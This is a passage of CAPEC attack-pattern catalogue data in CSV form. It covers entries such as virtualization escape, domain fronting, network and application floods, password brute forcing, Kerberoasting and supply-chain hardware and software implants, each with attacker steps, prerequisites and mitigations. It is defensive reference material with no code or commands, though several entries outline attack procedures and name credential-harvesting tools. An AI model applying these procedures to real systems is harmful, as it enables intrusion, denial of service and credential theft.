Virtualization\",Standard,Draft,\"An adversary gains access to an application, service, or device with the privileges of an authorized or privileged user by escaping the confines of a virtualized environment. The adversary is then able to access resources or execute unauthorized code within the host environment, generally with the privileges of the user running the virtualized process. Successfully executing an attack of this type is often the first step in executing more complex attacks.\",\"\",Low,Very High,\"::NATURE:ChildOf:CAPEC ID:115::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Probing] The adversary probes the target application, service, or device to find a possible weakness that would allow escaping the virtualized environment.:TECHNIQUE:Probing applications, services, or devices for virtualization weaknesses.::STEP:2:PHASE:Experiment:DESCRIPTION:[Verify the exploitable security weaknesses] Using the found weakness, the adversary attempts to escape the virtualized environment.:TECHNIQUE:Using an application weakness to escape a virtualized environment::STEP:3:PHASE:Exploit:DESCRIPTION:[Execute more complex attacks] Once outside of the virtualized environment, the adversary attempts to perform other more complex attacks such as accessing system resources or executing unauthorized code within the host environment.:TECHNIQUE:Executing complex attacks when given higher permissions by escaping a virtualized environment::\",\"\",\"\",\"\",\"\",\"::SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Bypass Protection Mechanism::SCOPE:Authorization:TECHNICAL IMPACT:Execute Unauthorized Commands:NOTE:Run Arbitrary Code::SCOPE:Accountability:SCOPE:Authentication:SCOPE:Authorization:SCOPE:Non-Repudiation:TECHNICAL IMPACT:Gain Privileges::\",\"::Ensure virtualization software is current and up-to-date.::Abide by the least privilege principle to avoid assigning users more privileges than necessary.::\",\"\",\"::693::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1611:ENTRY NAME:Escape to Host::\",\"\",\n481,\"Contradictory Destinations in Traffic Routing Schemes\",Standard,Draft,\"Adversaries can provide contradictory destinations when sending messages. Traffic is routed in networks using the domain names in various headers available at different levels of the OSI model. In a Content Delivery Network (CDN) multiple domains might be available, and if there are contradictory domain names provided it is possible to route traffic to an inappropriate destination. The technique, called Domain Fronting, involves using different domain names in the SNI field of the TLS header and the Host field of the HTTP header. An alternative technique, called Domainless Fronting, is similar, but the SNI field is left blank.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:161::\",\"\",\"::An adversary must be aware that their message will be routed using a CDN, and that both of the contradictory domains are served from that CDN.::If the purpose of the Domain Fronting is to hide redirected C2 traffic, the C2 server must have been created in the CDN.::\",\"::SKILL:The adversary must have some knowledge of how messages are routed.:LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data:TECHNICAL IMPACT:Modify Data::\",\"::Monitor connections, checking headers in traffic for contradictory domain names, or empty domain names.::\",\"\",\"::923::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1090.004:ENTRY NAME:Proxy:Domain Fronting::\",\"\",\n482,\"TCP Flood\",Standard,Draft,\"An adversary may execute a flooding attack using the TCP protocol with the intent to deny legitimate users access to a service. These attacks exploit the weakness within the TCP protocol where there is some state information for the connection the server needs to maintain. This often involves the use of TCP SYN messages.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:125::\",\"\",\"::This type of an attack requires the ability to generate a large amount of TCP traffic to send to the target port of a functioning server.::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of an attack, an organization can monitor incoming packets and look for patterns in the TCP traffic to determine if the network is under an attack. The potential target may implement a rate limit on TCP SYN messages which would provide limited capabilities while under attack.::\",\"\",\"::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service: Direct Network Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1499.001:ENTRY NAME:Endpoint Denial of Service: OS Exhaustion Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service: Service Exhaustion Flood::\",\"\",\n485,\"Signature Spoofing by Key Recreation\",Detailed,Draft,\"An attacker obtains an authoritative or reputable signer's private signature key by exploiting a cryptographic weakness in the signature algorithm or pseudorandom number generation and then uses this key to forge signatures from the original signer to mislead a victim into performing actions that benefit the attacker.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:473::\",\"\",\"::An authoritative signer is using a weak method of random number generation or weak signing software that causes key leakage or permits key inference.::An authoritative signer is using a signature algorithm with a direct weakness or with poorly chosen parameters that enable the key to be recovered using signatures from that signer.::\",\"::SKILL:Cryptanalysis of signature generation algorithm:LEVEL:High::SKILL:Reverse engineering and cryptanalysis of signature generation algorithm implementation and random number generation:LEVEL:High::SKILL:Ability to create malformed data blobs and know how to present them directly or indirectly to a victim.:LEVEL:High::\",\"\",\"\",\"\",\"::Ensure cryptographic elements have been sufficiently tested for weaknesses.::\",\"\",\"::330::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1552.004:ENTRY NAME:Unsecure Credentials: Private Keys::\",\"\",\n488,\"HTTP Flood\",Standard,Draft,\"An adversary may execute a flooding attack using the HTTP protocol with the intent to deny legitimate users access to a service by consuming resources at the application layer such as web services and their infrastructure. These attacks use legitimate session-based HTTP GET requests designed to consume large amounts of a server's resources. Since these are legitimate sessions this attack is very difficult to detect.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:125::\",\"\",\"::This type of an attack requires the ability to generate a large amount of HTTP traffic to send to a target server.::\",\"\",\"\",\"\",\"\",\"::Design: Use a Web Application Firewall (WAF) to help filter out malicious traffic. This can be setup with rules to block IP addresses found in IP reputation databases, which contains lists of known bad IP addresses. Analysts should also monitor when the traffic flow becomes abnormally large, and be able to add on-the-fly rules to block malicious traffic. Special care should be taken to ensure low false positive rates in block rules and functionality should be implemented to allow a legitimate user to resume sending traffic if they have been blocked.::Hire a third party provider to implement a Web Application Firewall (WAF) for your application. Third party providers have dedicated resources and expertise that could allow them to update rules and prevent HTTP Floods very quickly.::Design: Use a load balancer such as nginx to prevent small scale HTTP Floods by dispersing traffic between a group of servers.::Implementation: Make a requesting machine solve some kind of challenge before allowing them to send an HTTP request. This could be a captcha or something similar that works to deter bots.::\",\"\",\"::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::\",\"\",\n489,\"SSL Flood\",Standard,Draft,\"An adversary may execute a flooding attack using the SSL protocol with the intent to deny legitimate users access to a service by consuming all the available resources on the server side. These attacks take advantage of the asymmetric relationship between the processing power used by the client and the processing power used by the server to create a secure connection. In this manner the attacker can make a large number of HTTPS requests on a low provisioned machine to tie up a disproportionately large number of resources on the server. The clients then continue to keep renegotiating the SSL connection. When multiplied by a large number of attacking machines, this attack can result in a crash or loss of service to legitimate users.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:125::\",\"\",\"::This type of an attack requires the ability to generate a large amount of SSL traffic to send a target server.::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of an attack, an organization can create rule based filters to silently drop connections if too many are attempted in a certain time period.::\",\"\",\"::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::\",\"\",\n49,\"Password Brute Forcing\",Standard,Draft,\"An adversary tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:112::NATURE:CanPrecede:CAPEC ID:600::NATURE:CanPrecede:CAPEC ID:151::NATURE:CanPrecede:CAPEC ID:560::NATURE:CanPrecede:CAPEC ID:561::NATURE:CanPrecede:CAPEC ID:653::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine application's/system's password policy] Determine the password policies of the target application/system.:TECHNIQUE:Determine minimum and maximum allowed password lengths.:TECHNIQUE:Determine format of allowed passwords (whether they are required or allowed to contain numbers, special characters, etc.).:TECHNIQUE:Determine account lockout policy (a strict account lockout policy will prevent brute force attacks).::STEP:2:PHASE:Exploit:DESCRIPTION:[Brute force password] Given the finite space of possible passwords dictated by the password policy determined in the previous step, try all possible passwords for a known user ID until application/system grants access.:TECHNIQUE:Manually or automatically enter all possible passwords through the application/system's interface. In most systems, start with the shortest and simplest possible passwords, because most users tend to select such passwords if allowed to do so.:TECHNIQUE:Perform an offline dictionary attack or a rainbow table attack against a known password hash.::\",\"::An adversary needs to know a username to target.::The system uses password based authentication as the one factor authentication mechanism.::An application does not have a password throttling mechanism in place. A good password throttling mechanism will make it almost impossible computationally to brute force a password as it may either lock out the user after a certain number of incorrect attempts or introduce time out periods. Both of these would make a brute force attack impractical.::\",\"::SKILL:A brute force attack is very straightforward. A variety of password cracking tools are widely available.:LEVEL:Low::\",\"::A powerful enough computer for the job with sufficient CPU, RAM and HD. Exact requirements will depend on the size of the brute force job and the time requirement for completion. Some brute forcing jobs may require grid or distributed computing (e.g. DES Challenge).::\",\"::Many incorrect login attempts are detected by the system.::\",\"::SCOPE:Confidentiality:SCOPE:Access Control:SCOPE:Authorization:TECHNICAL IMPACT:Gain Privileges::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::SCOPE:Integrity:TECHNICAL IMPACT:Modify Data::\",\"::Implement a password throttling mechanism. This mechanism should take into account both the IP address and the log in name of the user.::Put together a strong password policy and make sure that all user created passwords comply with it. Alternatively automatically generate strong passwords for users.::Passwords need to be recycled to prevent aging, that is every once in a while a new password must be chosen.::\",\"::A system does not enforce a strong password policy and the user picks a five letter password consisting of lower case English letters only. The system does not implement any password throttling mechanism. Assuming the adversary does not know the length of the users' password, an adversary can brute force this password in maximum 1+26+26^2+26^3+26^4+26^5 = 1 + 26 + 676 + 17576 + 456976 + 11,881,376 = 12,356,631 attempts, and half these tries (6,178,316) on average. Using modern hardware this attack is trivial. If the adversary were to assume that the user password could also contain upper case letters (and it was case sensitive) and/or numbers, than the number of trials would have been larger. An adversary's job would have most likely been even easier because many users who choose easy to brute force passwords like this are also likely to use a word that can be found in the dictionary. Since there are far fewer valid English words containing up to five letters than 12,356,631, an attack that tries each of the entries in the English dictionary would go even faster.::A weakness exists in the automatic password generation routine of Mailman prior to 2.1.5 that causes only about five million different passwords to be generated. This makes it easy to brute force the password for all users who decided to let Mailman automatically generate their passwords for them. Users who chose their own passwords during the sign up process would not have been affected (assuming that they chose strong passwords). See also: CVE-2004-1143::\",\"::521::262::263::257::654::307::308::309::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1110.001:ENTRY NAME:Brute Force:Password Guessing::\",\"\",\n490,\"Amplification\",Standard,Draft,\"An adversary may execute an amplification where the size of a response is far greater than that of the request that generates it. The goal of this attack is to use a relatively few resources to create a large amount of traffic against a target server. To execute this attack, an adversary send a request to a 3rd party service, spoofing the source address to be that of the target server. The larger response that is generated by the 3rd party service is then sent to the target server. By sending a large number of initial requests, the adversary can generate a tremendous amount of traffic directed at the target. The greater the discrepancy in size between the initial request and the final payload delivered to the target increased the effectiveness of this attack.\",\"\",,,\"::NATURE:ChildOf:CAPEC ID:125::\",\"\",\"::This type of an attack requires the existence of a 3rd party service that generates a response that is significantly larger than the request that triggers it.::\",\"\",\"\",\"\",\"\",\"::To mitigate this type of an attack, an organization can attempt to identify the 3rd party services being used in an active attack and blocking them until the attack ends. This can be accomplished by filtering traffic for suspicious message patterns such as a spike in traffic where each response contains the same large block of data. Care should be taken to prevent false positive rates so legitimate traffic isn't blocked.::\",\"\",\"::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1498.002:ENTRY NAME:Network Denial of Service:Reflection Amplification::\",\"\",\n497,\"File Discovery\",Standard,Draft,\"An adversary engages in probing and exploration activities to determine if common key files exists. Such files often contain configuration and security parameters of the targeted application, system or network. Using this knowledge may often pave the way for more damaging attacks.\",\"\",High,Very Low,\"::NATURE:ChildOf:CAPEC ID:169::\",\"\",\"::The adversary must know the location of these common key files.::\",\"\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Read Data::\",\"::Leverage file protection mechanisms to render these files accessible only to authorized parties.::\",\"\",\"::200::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1083:ENTRY NAME:File and Directory Discovery::\",\"\",\n504,\"Task Impersonation\",Standard,Stable,\"An adversary, through a previously installed malicious application, impersonates an expected or routine task in an attempt to steal sensitive information or leverage a user's privileges.\",\"\",Medium,High,\"::NATURE:ChildOf:CAPEC ID:173::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine suitable tasks to exploit] Determine what tasks exist on the target system that may result in a user providing sensitive information.:TECHNIQUE:Determine what tasks prompt a user for their credentials.:TECHNIQUE:Determine what tasks may prompt a user to authorize a process to execute with elevated privileges.::STEP:2:PHASE:Exploit:DESCRIPTION:[Impersonate Task] Impersonate a legitimate task, either expected or unexpected, in an attempt to gain user credentials or to ride the user's privileges.:TECHNIQUE:Prompt a user for their credentials, while making the user believe the credential request is legitimate.:TECHNIQUE:Prompt a user to authorize a task to run with elevated privileges, while making the user believe the request is legitimate.::\",\"::The adversary must already have access to the target system via some means.::A legitimate task must exist that an adversary can impersonate to glean credentials.::The user's privileges allow them to execute certain tasks with elevated privileges.::\",\"::SKILL:Once an adversary has gained access to the target system, impersonating a task is trivial.:LEVEL:Low::\",\"::Malware or some other means to initially comprise the target system.::Additional malware to impersonate a legitimate task.::\",\"::Credential or permission elevation prompts that appear illegitimate or unexpected.::\",\"::SCOPE:Access Control:SCOPE:Authentication:TECHNICAL IMPACT:Gain Privileges::\",\"::The only known mitigation to this attack is to avoid installing the malicious application on the device. However, to impersonate a running task the malicious application does need the GET_TASKS permission to be able to query the task list, and being suspicious of applications with that permission can help.::\",\"::An adversary monitors the system task list for Microsoft Outlook in an attempt to determine when the application may prompt the user to enter their credentials to view encrypted email. Once the task is executed, the adversary impersonates the credential prompt to obtain the user's Microsoft Outlook encryption credentials. These credentials can then be leveraged by the adversary to read a user's encrypted email.::An adversary prompts a user to authorize an elevation of privileges, implying that a background task needs additional permissions to execute. The user accepts the privilege elevation, allowing the adversary to execute additional malware or tasks with the user's privileges.::\",\"::1021::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1036.004:ENTRY NAME:Masquerading: Masquerade Task or Service::\",\"\",\n509,\"Kerberoasting\",Detailed,Stable,\"Through the exploitation of how service accounts leverage Kerberos authentication with Service Principal Names (SPNs), the adversary obtains and subsequently cracks the hashed credentials of a service account target to exploit its privileges. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. As an authenticated user, the adversary may request Active Directory and obtain a service ticket with portions encrypted via RC4 with the private key of the authenticated account. By extracting the local ticket and saving it disk, the adversary can brute force the hashed value to reveal the target account credentials.\",\"\",,High,\"::NATURE:ChildOf:CAPEC ID:652::NATURE:CanPrecede:CAPEC ID:151::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:Scan for user accounts with set SPN values:TECHNIQUE:These can be found via Powershell or LDAP queries, as well as enumerating startup name accounts and other means.::STEP:2:PHASE:Explore:DESCRIPTION:Request service tickets:TECHNIQUE:Using user account's SPN value, request other service tickets from Active Directory::STEP:3:PHASE:Experiment:DESCRIPTION:Extract ticket and save to disk:TECHNIQUE:Certain tools like Mimikatz can extract local tickets and save them to memory/disk.::STEP:4:PHASE:Exploit:DESCRIPTION:Crack the encrypted ticket to harvest plain text credentials:TECHNIQUE:Leverage a brute force application/script on the hashed value offline until cracked. The shorter the password, the easier it is to crack.::\",\"::The adversary requires access as an authenticated user on the system. This attack pattern relates to elevating privileges.::The adversary requires use of a third-party credential harvesting tool (e.g., Mimikatz).::The adversary requires a brute force tool.::\",\"::SKILL::LEVEL:Medium::\",\"\",\"\",\"::SCOPE:Confidentiality:TECHNICAL IMPACT:Gain Privileges::\",\"::Monitor system and domain logs for abnormal access.::Employ a robust password policy for service accounts. Passwords should be of adequate length and complexity, and they should expire after a period of time.::Employ the principle of least privilege: limit service accounts privileges to what is required for functionality and no more.::Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.::\",\"::PowerSploit's Invoke-Kerberoast module can be leveraged to request Ticket Granting Service (TGS) tickets and return crackable ticket hashes. [REF-585] [REF-586]::\",\"::522::308::309::294::263::262::521::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1558.003:ENTRY NAME:Steal or Forge Kerberos Tickets:Kerberoasting::\",\"\",\n511,\"Infiltration of Software Development Environment\",Detailed,Draft,\"An attacker uses common delivery mechanisms such as email attachments or removable media to infiltrate the IDE (Integrated Development Environment) of a victim manufacturer with the intent of implanting malware allowing for attack control of the victim IDE environment. The attack then uses this access to exfiltrate sensitive data or information, manipulate said data or information, and conceal these actions. This will allow and aid the attack to meet the goal of future compromise of a recipient of the victim's manufactured product further down in the supply chain.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).::The victim must have a system running exploitable applications and/or a vulnerable configuration to allow for initial infiltration.::The attacker must have working knowledge of some if not all of the components involved in the IDE system as well as the infrastructure.::\",\"::SKILL:Intelligence about the manufacturer's operating environment and infrastructure.:LEVEL:Medium::SKILL:Ability to develop, deploy, and maintain a stealth malicious backdoor program remotely in what is essentially a hostile environment.:LEVEL:High::SKILL:Development skills to construct malicious attachments that can be used to exploit vulnerabilities in typical desktop applications or system configurations. The malicious attachments should be crafted well enough to bypass typical defensive systems (IDS, anti-virus, etc):LEVEL:High::\",\"\",\"\",\"\",\"::Avoid the common delivery mechanisms of adversaries, such as email attachments, which could introduce the malware.::\",\"::The attacker, knowing the victim runs email on a system adjacent to the IDE system, sends a phishing email with a malicious attachment to the victim. When viewed, the malicious attachment installs a backdoor that allows the attacker to remotely compromise the adjacent IDE system from the victim's workstation. The attacker is then able to exfiltrate sensitive data about the software being developed on the IDE system.::Using rogue versions of Xcode (Apple's app development tool) downloaded from third-party websites, it was possible for the adversary to insert malicious code into legitimate apps during the development process.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.001:ENTRY NAME:Supply Chain Compromise: Compromise Software Dependencies and Development Tools::\",\"\","
  },
  "doc-e79d492bbd50ad1ecd12acdef1031425": {
    "content": "'ID,Name,Abstraction,Status,Description,Alternate Terms,Likelihood Of Attack,Typical Severity,Related Attack Patterns,Execution Flow,Prerequisites,Skills Required,Resources Required,Indicators,Consequences,Mitigations,Example Instances,Related Weaknesses,Taxonomy Mappings,Notes\n516,\"Hardware Component Substitution During Baselining\",Detailed,Draft,\"An adversary with access to system components during allocated baseline development can substitute a maliciously altered hardware component for a baseline component during the product development and research phases. This can lead to adjustments and calibrations being made in the product so that when the final product, now containing the modified component, is deployed it will not perform as designed and be advantageous to the adversary.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::The adversary will need either physical access or be able to supply malicious hardware components to the product development facility.::\",\"::SKILL:Intelligence data on victim's purchasing habits.:LEVEL:Medium::SKILL:Resources to maliciously construct/alter hardware components used for testing by the supplier.:LEVEL:High::SKILL:Resources to physically infiltrate supplier.:LEVEL:High::\",\"\",\"\",\"\",\"::Hardware attacks are often difficult to detect, as inserted components can be difficult to identify or remain dormant for an extended period of time.::Acquire hardware and hardware components from trusted vendors. Additionally, determine where vendors purchase components or if any components are created/acquired via subcontractors to determine where supply chain risks may exist.::\",\"::An adversary supplies the product development facility of a network security device with a hardware component that is used to simulate large volumes of network traffic. The device claims in logs, stats, and via the display panel to be pumping out very large quantities of network traffic, when it is in fact putting out very low volumes. The developed product is adjusted and configured to handle what it believes to be a heavy network load, but when deployed at the victim site the large volumes of network traffic are dropped instead of being processed by the network security device. This allows the adversary an advantage when attacking the victim in that the adversary's presence may not be detected by the device.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n520,\"Counterfeit Hardware Component Inserted During Product Assembly\",Detailed,Draft,\"An adversary with either direct access to the product assembly process or to the supply of subcomponents used in the product assembly process introduces counterfeit hardware components into product assembly. The assembly containing the counterfeit components results in a system specifically designed for malicious purposes.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:444::\",\"\",\"::The adversary will need either physical access or be able to supply malicious hardware components to the product development facility.::\",\"::SKILL:Resources to maliciously construct components used by the manufacturer.:LEVEL:High::SKILL:Resources to physically infiltrate manufacturer or manufacturer's supplier.:LEVEL:High::\",\"\",\"\",\"\",\"::Hardware attacks are often difficult to detect, as inserted components can be difficult to identify or remain dormant for an extended period of time.::Acquire hardware and hardware components from trusted vendors. Additionally, determine where vendors purchase components or if any components are created/acquired via subcontractors to determine where supply chain risks may exist.::\",\"::A manufacturer of a firewall system requires a hardware card which functions as a multi-jack ethernet card with four ethernet ports. The adversary constructs a counterfeit card that functions normally except that packets from the adversary's network are allowed to bypass firewall processing completely. Once deployed at a victim location, this allows the adversary to bypass the firewall unrestricted.::In 2018 it was discovered that Chinese spies infiltrated several U.S. government agencies and corporations as far back as 2015 by including a malicious microchip within the motherboard of servers sold by Elemental Technologies to the victims. Although these servers were assembled via a U.S. based company, the motherboards used within the servers were manufactured and maliciously altered via a Chinese subcontractor. Elemental Technologies then sold these malicious servers to various U.S. government agencies, such as the DoD and CIA, and corporations like Amazon and Apple. The malicious microchip provided adversaries with a backdoor into the system, which further allowed them to access any network that contained the exploited systems, to exfiltrate data to be sent to the Chinese government.[REF-713]::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n522,\"Malicious Hardware Component Replacement\",Standard,Draft,\"An adversary replaces legitimate hardware in the system with faulty counterfeit or tampered hardware in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:439::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Target Hardware] The adversary must first identify a system that they wish to target, and a specific hardware component that they can swap out with a malicious replacement.:TECHNIQUE:Look for datasheets containing the system schematics that can help identify possible target hardware.:TECHNIQUE:Procure a system and inspect it manually, looking for possible hardware component targets. Search for manufacturer IDs on hardware chips or FCC IDs on wireless chips to determine their functionality.::STEP:2:PHASE:Explore:DESCRIPTION:[Discover Vulnerability in Supply Chain] The adversary maps out the supply chain for the targeted system. They look for ooportunities to gain physical access to the system after it has left the manufacturer, but before it is deployed to the victim.:TECHNIQUE:Procure a system and observe the steps it takes in the shipment process.:TECHNIQUE:Identify possible warehouses that systems are stored after manufacturing.::STEP:3:PHASE:Experiment:DESCRIPTION:[Test a Malicious Component Replacement] Before performing the attack in the wild, an adversary will test the attack on a system they have procured to ensure that the desired outcome will be achieved.:TECHNIQUE:Design a malicious hardware component that will perform the same functionality as the target component, but also contains additional functionality.:TECHNIQUE:Obtain already designed malicious components that just need to be placed into the system.::STEP:3:PHASE:Exploit:DESCRIPTION:[Substitute Components in the Supply Chain] Using the vulnerability in the supply chain of the system discovered in the explore phase, the adversary substitutes the malicious component for the targeted component. This results in the adversary gaining unintended access to systems once they reach the victim and can lead to a variety of follow up attacks.::\",\"::Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.::\",\"::SKILL:Advanced knowledge of the design of the system.:LEVEL:High::SKILL:Hardware creation and manufacture of replacement components.:LEVEL:High::\",\"\",\"\",\"\",\"::Ensure that all contractors and sub-suppliers use trusted means of shipping (e.g., bonded/cleared/vetted and insured couriers) to ensure that components, once purchased, are not subject to compromise during their delivery.::Prevent or detect tampering with critical hardware or firmware components while in transit through use of state-of-the-art anti-tamper devices.::Use tamper-resistant and tamper-evident packaging when shipping critical components (e.g., plastic coating for circuit boards, tamper tape, paint, sensors, and/or seals for cases and containers) and inspect received system components for evidence of tampering.::\",\"::During shipment the adversary is able to intercept a system that has been purchased by the victim, and replaces a math processor card that functions just like the original, but contains advanced malicious capability. Once deployed, the system functions as normal, but allows for the adversary to remotely communicate with the system and use it as a conduit for additional compromise within the victim's environment.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise Hardware Supply Chain::\",\"\",\n523,\"Malicious Software Implanted\",Standard,Draft,\"An attacker implants malicious software into the system in the supply chain distribution channel, with purpose of causing malicious disruption or allowing for additional compromise when the system is deployed.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:439::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Determine Entry Point] The adversary must first identify a system that they wish to target and search for an entry point they can use to install the malicious software. This could be a system which they have prior knowledge of, giving them insight into the software and environment.:TECHNIQUE:Use a JTAGulator to identify exposed JTAG and UART interfaces in smaller embedded systems.:TECHNIQUE:Identify exposed USB connectors that could be used to load software.::STEP:2:PHASE:Explore:DESCRIPTION:[Discover Vulnerability in Supply Chain] The adversary maps out the supply chain for the targeted system. They look for ooportunities to gain physical access to the system after it has left the manufacturer, but before it is deployed to the victim.:TECHNIQUE:Procure a system and observe the steps it takes in the shipment process.:TECHNIQUE:Identify possible warehouses that systems are stored after manufacturing.::STEP:3:PHASE:Experiment:DESCRIPTION:[Test Malicious Software] Before performing the attack in the wild, an adversary will test the attack on a system they have procured to ensure that the desired outcome will be achieved.:TECHNIQUE:Design malicious software that will give an adversary a backdoor into the system once it is deployed to the victim.:TECHNIQUE:Obtain already designed malicious software that just need to be placed into the system.::STEP:4:PHASE:Exploit:DESCRIPTION:[Implant Software in the Supply Chain] Using the vulnerability in the supply chain of the system discovered in the explore phase, the adversary implants the malicious software into the system. This results in the adversary gaining unintended access to systems once they reach the victim and can lead to a variety of follow up attacks.::\",\"::Physical access to the system after it has left the manufacturer but before it is deployed at the victim location.::\",\"::SKILL:Advanced knowledge of the design of the system and it's operating system components and subcomponents.:LEVEL:High::SKILL:Malicious software creation.:LEVEL:High::\",\"\",\"\",\"\",\"::Deploy strong code integrity policies to allow only authorized apps to run.::Use endpoint detection and response solutions that can automaticalkly detect and remediate suspicious activities.::Maintain a highly secure build and update infrastructure by immediately applying security patches for OS and software, implementing mandatory integrity controls to ensure only trusted tools run, and requiring multi-factor authentication for admins.::Require SSL for update channels and implement certificate transparency based verification.::Sign everything, including configuration files, XML files and packages.::Develop an incident response process, disclose supply chain incidents and notify customers with accurate and timely information.::\",\"::An attacker has created a piece of malicious software designed to function as a backdoor in a system that is to be deployed at the victim location. During shipment of the system, the attacker has physical access to the system at a loading dock of an integrator for a short time. The attacker unpacks and powers up the system and installs the malicious piece of software, and configures it to run upon system boot. The system is repackaged and returned to its place on the loading dock, and is shipped and installed at the victim location with the malicious software in place, allowing the attacker to bypass firewalls and remotely gain access to the victim's network for further malicious activities.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.002:ENTRY NAME:Supply Chain Compromise: Compromise Software Supply Chain::\",\"\",\n528,\"XML Flood\",Standard,Draft,\"An adversary may execute a flooding attack using XML messages with the intent to deny legitimate users access to a web service. These attacks are accomplished by sending a large number of XML based requests and letting the service attempt to parse each one. In many cases this type of an attack will result in a XML Denial of Service (XDoS) due to an application becoming unstable, freezing, or crashing.\",\"::TERM:XML Denial of Service (XML DoS):DESCRIPTION:::\",Low,Medium,\"::NATURE:ChildOf:CAPEC ID:125::\",\"::STEP:1:PHASE:Explore:DESCRIPTION:[Survey the target] Using a browser or an automated tool, an attacker records all instance of web services to process XML requests.:TECHNIQUE:Use an automated tool to record all instances of URLs to process XML requests.:TECHNIQUE:Use a browser to manually explore the website and analyze how the application processes XML requests.::STEP:2:PHASE:Experiment:DESCRIPTION:An adversary crafts input data that may have an adverse effect on the operation of the web service when the XML data sent to the service.::STEP:3:PHASE:Exploit:DESCRIPTION:[Launch a resource depletion attack] The attacker delivers a large number of XML messages to the target URLs found in the explore phase at a sufficiently rapid rate. It causes denial of service to the target application.:TECHNIQUE:Send a large number of crafted XML messages to the target URL.::\",\"::The target must receive and process XML transactions.::An adverssary must possess the ability to generate a large amount of XML based messages to send to the target service.::\",\"::SKILL:Denial of service:LEVEL:Low::\",\"\",\"::A large amount of data is passed to the XML parser possibly making it crash or otherwise unavailable to end users.::\",\"::SCOPE:Availability:TECHNICAL IMPACT:Resource Consumption::\",\"::Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.::Implementation: Provide for network flow control and traffic shaping to control access to the resources.::\",\"::Consider the case of attack performed against the createCustomerBillingAccount Web Service for an online store. In this case, the createCustomerBillingAccount Web Service receives a huge number of simultaneous requests, containing nonsense billing account creation information (the small XML messages). The createCustomerBillingAccount Web Services may forward the messages to other Web Services for processing. The application suffers from a high load of requests, potentially leading to a complete loss of availability the involved Web Service.::\",\"::770::\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1499.002:ENTRY NAME:Endpoint Denial of Service:Service Exhaustion Flood::::TAXONOMY NAME:ATTACK:ENTRY ID:1498.001:ENTRY NAME:Network Denial of Service:Direct Network Flood::\",\"\",\n531,\"Hardware Component Substitution\",Detailed,Draft,\"An attacker substitutes out a tested and approved hardware component for a maliciously-altered hardware component. This type of attack is carried out directly on the system, enabling the attacker to then cause disruption or additional compromise.\",\"\",Low,High,\"::NATURE:ChildOf:CAPEC ID:534::\",\"\",\"::Physical access to the system or the integration facility where hardware components are kept.::\",\"::SKILL:Able to develop and manufacture malicious system components that perform the same functions and processes as their non-malicious counterparts.:LEVEL:High::\",\"\",\"\",\"\",\"\",\"::An attacker has access to an organization's warehouse of card readers being included as a part of an overall security system. By replacing a critical hardware component in the card reader, the attacker is able to alter the function of the card reader to allow an attacker-supplied card to bypass a security checkpoint. The card reader is placed in the warehouse, and later used in the victim's security system. The attacker is then able to go to the victim and use their own card and bypass a physical security checkpoint and gain access to the victim's location for further malicious activity.::\",\"\",\"TAXONOMY NAME:ATTACK:ENTRY ID:1195.003:ENTRY NAME:Supply Chain Compromise: Compromise 